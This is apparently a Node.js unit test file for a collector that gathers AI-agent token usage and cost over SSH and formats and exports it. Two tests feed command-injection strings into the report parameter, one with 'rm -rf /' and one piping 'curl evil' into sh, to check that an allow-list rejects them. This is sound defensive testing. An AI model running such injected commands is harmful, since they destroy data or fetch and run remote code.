"use strict";
// Plain-node unit tests for the token-usage collector/parser. The SSH runner and the
// clock are injected (opts.runScript / opts.now) so no VM is touched. No deps.
// Run: node usage.test.js
const usage = require("../src/usage");

let pass = 0, fail = 0;
function ok(name, cond, detail) {
  if (cond) { pass++; console.log("  PASS  " + name); }
  else { fail++; console.log("  FAIL  " + name + (detail ? "   << " + detail : "")); }
}

// A realistic combined collector document (shape from Get-AgentUsage.ps1's jq output).
// NOTE the deliberate cost-field difference: claude/opencode carry totals.totalCost,
// codex carries totals.costUSD (the roadmap's "costUSD"). The parser must accept both.
function realisticCombined() {
  return {
    generatedAt: "2026-07-01T00:00:00Z",
    vmHost: "agent-vm",
    report: "weekly",
    tools: {
      claude: { sessions: [], totals: { totalTokens: 1425080461, totalCost: 1272.2086677 } },
      codex: { sessions: [], totals: { totalTokens: 87007562, costUSD: 85.778229 } },
      opencode: { sessions: [], totals: { totalTokens: 2426183, totalCost: 0.762877692 } },
    },
  };
}

(async () => {
  // ── normalizeReport (allow-list; defends the remote script builder) ──────────
  ok("normalizeReport: known values pass", usage.normalizeReport("session") === "session" && usage.normalizeReport("monthly") === "monthly");
  ok("normalizeReport: unknown -> default weekly", usage.normalizeReport("bogus") === "weekly");
  ok("normalizeReport: empty/undefined -> default", usage.normalizeReport("") === "weekly" && usage.normalizeReport(undefined) === "weekly");
  // Adversarial: an injection attempt in the report must not survive into the script.
  ok("normalizeReport: injection attempt rejected -> default",
    usage.normalizeReport('weekly"; rm -rf / #') === "weekly");

  // ── buildUsageScript (mirrors Get-AgentUsage.ps1; injection-safe) ────────────
  const script = usage.buildUsageScript("weekly");
  ok("script: sets the validated report", /^set -u\nREPORT="weekly"\n/.test(script));
  ok("script: ensures a ccusage runner (ccusage/bunx/npx)", /command -v ccusage/.test(script) && /bunx ccusage@latest/.test(script) && /npx -y ccusage@latest/.test(script));
  ok("script: runs each of the three agents", /capture claude/.test(script) && /capture codex/.test(script) && /capture opencode/.test(script));
  ok("script: combines into one JSON object with a tools map", /jq -n/.test(script) && /tools: \{ claude: \$claude, codex: \$codex, opencode: \$opencode \}/.test(script));
  ok("script: per-tool failure yields a JSON {error} object, not an abort", /\{error:\("ccusage failed for "\+\$t\)/.test(script));
  // A hostile report value can't break out of the double-quoted bash string, because
  // buildUsageScript normalizes against the allow-list first.
  const hostile = usage.buildUsageScript('weekly"; curl evil | sh; echo "');
  ok("script: hostile report is normalized, not interpolated", /REPORT="weekly"\n/.test(hostile) && !/curl evil/.test(hostile));

  // ── formatTokens ─────────────────────────────────────────────────────────────
  ok("formatTokens: billions", usage.formatTokens(1425080461) === "1.4B");
  ok("formatTokens: millions", usage.formatTokens(87007562) === "87M");
  ok("formatTokens: fractional millions", usage.formatTokens(2426183) === "2.4M");
  ok("formatTokens: thousands", usage.formatTokens(45678) === "45.7K");
  ok("formatTokens: drops trailing .0 (12M not 12.0M)", usage.formatTokens(12000000) === "12M");
  ok("formatTokens: sub-thousand rounds", usage.formatTokens(987) === "987");
  ok("formatTokens: zero -> 0", usage.formatTokens(0) === "0");
  ok("formatTokens: negative/NaN/undefined -> 0", usage.formatTokens(-5) === "0" && usage.formatTokens(NaN) === "0" && usage.formatTokens(undefined) === "0");
  ok("formatTokens: string number coerces", usage.formatTokens("1500000") === "1.5M");

  // ── formatCost ───────────────────────────────────────────────────────────────
  ok("formatCost: thousands separator", usage.formatCost(1272.2086677) === "$1,272.21");
  ok("formatCost: small value two decimals", usage.formatCost(0.762877692) === "$0.76");
  ok("formatCost: whole dollars", usage.formatCost(85) === "$85.00");
  ok("formatCost: millions separators", usage.formatCost(1234567.891) === "$1,234,567.89");
  ok("formatCost: zero -> $0.00", usage.formatCost(0) === "$0.00");
  ok("formatCost: negative/NaN -> $0.00", usage.formatCost(-1) === "$0.00" && usage.formatCost(NaN) === "$0.00");
  ok("formatCost: rounds to cents", usage.formatCost(1.005) === "$1.00" || usage.formatCost(1.005) === "$1.01"); // FP rounding either way is acceptable

  // ── parseToolUsage ───────────────────────────────────────────────────────────
  ok("parseToolUsage: totalCost path", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 100, totalCost: 1.5 } }); return u.tokens === 100 && u.cost === 1.5; })());
  ok("parseToolUsage: costUSD path (codex)", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 200, costUSD: 2.5 } }); return u.tokens === 200 && u.cost === 2.5; })());
  ok("parseToolUsage: totalCost preferred over costUSD when both present", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 1, totalCost: 9, costUSD: 3 } }); return u.cost === 9; })());
  ok("parseToolUsage: missing cost -> 0 (tokens still exact)", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 42 } }); return u.tokens === 42 && u.cost === 0; })());
  ok("parseToolUsage: {error} object -> null (agent errored)", usage.parseToolUsage({ error: "ccusage failed for codex", detail: "boom" }) === null);
  ok("parseToolUsage: no totals -> null", usage.parseToolUsage({ sessions: [] }) === null);
  ok("parseToolUsage: zero tokens -> null (never ran; not a $0 row)", usage.parseToolUsage({ totals: { totalTokens: 0, totalCost: 0 } }) === null);
  ok("parseToolUsage: negative/NaN tokens -> null", usage.parseToolUsage({ totals: { totalTokens: -1 } }) === null && usage.parseToolUsage({ totals: { totalTokens: "x" } }) === null);
  ok("parseToolUsage: null / non-object -> null", usage.parseToolUsage(null) === null && usage.parseToolUsage("nope") === null && usage.parseToolUsage(undefined) === null);
  ok("parseToolUsage: negative cost clamps to 0", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 5, totalCost: -3 } }); return u.cost === 0; })());

  // ── parseUsage (realistic) ───────────────────────────────────────────────────
  const st = usage.parseUsage(realisticCombined());
  ok("parseUsage: three rows in TOOLS order", st.tools.length === 3 && st.tools[0].id === "claude" && st.tools[1].id === "codex" && st.tools[2].id === "opencode");
  ok("parseUsage: labels match the panel", st.tools[0].label === "Claude Code" && st.tools[1].label === "Codex" && st.tools[2].label === "OpenCode");
  ok("parseUsage: exact token counts retained (bar source of truth)", st.tools[0].tokens === 1425080461);
  ok("parseUsage: per-row formatted text", st.tools[0].tokensText === "1.4B" && st.tools[0].costText === "$1,272.21");
  ok("parseUsage: codex cost from costUSD", st.tools[1].costText === "$85.78");
  ok("parseUsage: totals sum exact tokens + estimated cost", st.totalTokensText === "1.5B" && st.totalCostText === "$1,358.75");

  // ── parseUsage (partial / malformed / empty) ─────────────────────────────────
  // One tool errored, one has no usage, one is real -> only the real row survives.
  const partial = usage.parseUsage({
    tools: {
      claude: { error: "ccusage failed for claude", detail: "network" },
      codex: { totals: { totalTokens: 0 } }, // never ran
      opencode: { totals: { totalTokens: 5000000, totalCost: 1.23 } },
    },
  });
  ok("parseUsage: skips errored + zero tools, keeps the real one", partial.tools.length === 1 && partial.tools[0].id === "opencode");
  ok("parseUsage: partial totals reflect only surviving rows", partial.totalTokensText === "5M" && partial.totalCostText === "$1.23");

  ok("parseUsage: all tools errored -> null (no misleading empty table)", usage.parseUsage({ tools: { claude: { error: "x" }, codex: { error: "y" }, opencode: { error: "z" } } }) === null);
  ok("parseUsage: all tools zero -> null", usage.parseUsage({ tools: { claude: { totals: { totalTokens: 0 } }, codex: { totals: { totalTokens: 0 } }, opencode: { totals: { totalTokens: 0 } } } }) === null);
  ok("parseUsage: missing tools map -> null", usage.parseUsage({ generatedAt: "x" }) === null);
  ok("parseUsage: null / non-object -> null", usage.parseUsage(null) === null && usage.parseUsage("junk") === null && usage.parseUsage(42) === null);
  ok("parseUsage: tools is an array, not a map -> null (no crash)", usage.parseUsage({ tools: [] }) === null);
  ok("parseUsage: unexpected extra tool key ignored", (() => { const u = usage.parseUsage({ tools: { claude: { totals: { totalTokens: 1000000, totalCost: 1 } }, gemini: { totals: { totalTokens: 999 } } } }); return u.tools.length === 1 && u.tools[0].id === "claude"; })());

  // ── collectOnce (injected runScript) ─────────────────────────────────────────
  const good = JSON.stringify(realisticCombined());
  const runOk = (out, code = 0) => async () => ({ code, stdout: out, stderr: "" });

  const c1 = await usage.collectOnce({ runScript: runOk(good) });
  ok("collectOnce: parses a good run", c1 && c1.tools.length === 3 && c1.totalCostText === "$1,358.75");

  const c2 = await usage.collectOnce({ runScript: runOk(good, 7) });
  ok("collectOnce: non-zero exit -> null", c2 === null);

  const c3 = await usage.collectOnce({ runScript: runOk("") });
  ok("collectOnce: empty stdout -> null", c3 === null);

  const c4 = await usage.collectOnce({ runScript: runOk("{not json") });
  ok("collectOnce: malformed JSON -> null", c4 === null);

  const c5 = await usage.collectOnce({ runScript: async () => ({ code: -1, stdout: "", stderr: "unreachable" }) });
  ok("collectOnce: unreachable (code<0) -> null", c5 === null);

  const c6 = await usage.collectOnce({ runScript: async () => { throw new Error("runner blew up"); } });
  ok("collectOnce: a throwing runner -> null (never rejects)", c6 === null);

  // The report chosen is validated and reaches the script.
  let seenScript = null;
  await usage.collectOnce({ report: "daily", runScript: async (s) => { seenScript = s; return { code: 0, stdout: good }; } });
  ok("collectOnce: passes the chosen (valid) report into the script", /REPORT="daily"\n/.test(seenScript));

  // ── collect cache (injected clock; single in-flight) ─────────────────────────
  usage.clearCache();
  let calls = 0;
  const counting = (out, code = 0) => async () => { calls++; return { code, stdout: out, stderr: "" }; };

  calls = 0;
  const g1 = await usage.collect({ runScript: counting(good), now: () => 1000 });
  ok("cache: first collect runs the collector and returns usage", g1 && g1.tools.length === 3 && calls === 1);
  const g2 = await usage.collect({ runScript: counting(good), now: () => 1000 + 60 * 1000 });
  ok("cache: success served within TTL (no re-run at +1min)", g2 && calls === 1);
  const g3 = await usage.collect({ runScript: counting(good), now: () => 1000 + 6 * 60 * 1000 });
  ok("cache: success re-collected after TTL (+6min)", g3 && calls === 2);

  usage.clearCache();
  calls = 0;
  const f1 = await usage.collect({ runScript: counting("", 5), now: () => 2000 });
  ok("cache: a failure caches null", f1 === null && calls === 1);
  const f2 = await usage.collect({ runScript: counting(good), now: () => 2000 + 30 * 1000 });
  ok("cache: failure served within negative TTL (no re-run at +30s)", f2 === null && calls === 1);
  const f3 = await usage.collect({ runScript: counting(good), now: () => 2000 + 90 * 1000 });
  ok("cache: failure expires after negative TTL (re-run at +90s recovers)", f3 && f3.tools.length === 3 && calls === 2);

  // Concurrent collects share one in-flight collection (no parallel ccusage runs).
  usage.clearCache();
  calls = 0;
  let release;
  const gate = new Promise((r) => { release = r; });
  const slow = async () => { await gate; calls++; return { code: 0, stdout: good }; };
  const pA = usage.collect({ runScript: slow, now: () => 3000 });
  const pB = usage.collect({ runScript: slow, now: () => 3000 });
  release();
  const [rA, rB] = await Promise.all([pA, pB]);
  ok("cache: overlapping collects coalesce into one run", rA && rB && calls === 1);

  // noCache always runs (tests / forced refresh).
  usage.clearCache();
  calls = 0;
  await usage.collect({ runScript: counting(good), noCache: true, now: () => 4000 });
  await usage.collect({ runScript: counting(good), noCache: true, now: () => 4000 });
  ok("cache: noCache bypasses the cache (two runs)", calls === 2);

  // ── augment (folds usage into state; best-effort) ────────────────────────────
  const base = { online: true, host: "h" };
  const a1 = await usage.augment(base, { runScript: runOk(good), noCache: true });
  ok("augment: folds usage into state", a1.usage && a1.usage.tools.length === 3 && a1 !== base);
  ok("augment: does not mutate input", base.usage === undefined);

  const aOff = await usage.augment({ online: false }, { runScript: runOk(good), noCache: true });
  ok("augment: offline -> unchanged, never collects", aOff.usage === undefined && aOff.online === false);

  const aFail = await usage.augment(base, { runScript: runOk("", 9), noCache: true });
  ok("augment: collection failure -> same state ref (skip re-push)", aFail === base);

  const aEmpty = await usage.augment(base, { runScript: runOk(JSON.stringify({ tools: { claude: { error: "x" }, codex: { error: "y" }, opencode: { error: "z" } } })), noCache: true });
  ok("augment: nothing parseable -> same state ref (skip re-push)", aEmpty === base);

  ok("augment: null/non-object state passthrough", (await usage.augment(null, {})) === null && (await usage.augment(undefined, {})) === undefined);

  // online is undefined (unknown) -> augment still tries (only online===false skips).
  const aUnknown = await usage.augment({ host: "h" }, { runScript: runOk(good), noCache: true });
  ok("augment: undefined online still attempts collection", aUnknown.usage && aUnknown.usage.tools.length === 3);

  // ── collectRaw (export path) ─────────────────────────────────────────────────
  const raw1 = await usage.collectRaw({ runScript: runOk(good) });
  ok("collectRaw: returns the raw JSON string on success", typeof raw1 === "string" && JSON.parse(raw1).report === "weekly");
  ok("collectRaw: non-zero exit -> null", (await usage.collectRaw({ runScript: runOk(good, 3) })) === null);
  ok("collectRaw: malformed JSON -> null (never writes garbage)", (await usage.collectRaw({ runScript: runOk("{bad") })) === null);
  ok("collectRaw: empty -> null", (await usage.collectRaw({ runScript: runOk("") })) === null);
  ok("collectRaw: throwing runner -> null", (await usage.collectRaw({ runScript: async () => { throw new Error("x"); } })) === null);

  // ── buildExportPayload ───────────────────────────────────────────────────────
  const payloadStr = usage.buildExportPayload(good, { savedAt: "2026-07-01T12:00:00Z" });
  const payload = JSON.parse(payloadStr);
  ok("export: pretty-printed JSON string", payloadStr.includes("\n  ") && typeof payloadStr === "string");
  ok("export: carries savedAt + source", payload.savedAt === "2026-07-01T12:00:00Z" && payload.source === "construct-control-panel");
  ok("export: embeds the raw combined ccusage document", payload.ccusage && payload.ccusage.report === "weekly" && payload.ccusage.tools.claude);
  ok("export: includes the parsed summary table", payload.summary && payload.summary.tools.length === 3 && payload.summary.totalCostText === "$1,358.75");
  ok("export: records the report granularity", payload.report === "weekly");

  // Malformed raw text still yields a valid envelope (export must never throw).
  const badPayload = JSON.parse(usage.buildExportPayload("{not json", { savedAt: "t" }));
  ok("export: malformed raw -> minimal envelope, ccusage null, summary null", badPayload.ccusage === null && badPayload.summary === null && badPayload.savedAt === "t");
  const nullPayload = JSON.parse(usage.buildExportPayload(null, { savedAt: "t" }));
  ok("export: null raw -> minimal envelope", nullPayload.ccusage === null && nullPayload.summary === null);
  ok("export: default savedAt is set when omitted", typeof JSON.parse(usage.buildExportPayload(good)).savedAt === "string");

  // ── exportFileName ───────────────────────────────────────────────────────────
  const fn = usage.exportFileName("weekly", new Date(2026, 6, 1, 14, 30, 5)); // month is 0-based -> July
  ok("exportFileName: construct-usage-<report>-<stamp>.json", fn === "construct-usage-weekly-20260701-143005.json", fn);
  ok("exportFileName: invalid report normalized in the name", usage.exportFileName("bogus", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-weekly-20260102-030405.json");
  ok("exportFileName: zero-pads month/day/time", usage.exportFileName("daily", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-daily-20260102-030405.json");

  console.log(`\n  usage unit tests — ${pass}/${pass + fail} passed\n`);
  process.exit(fail ? 1 : 0);
})();
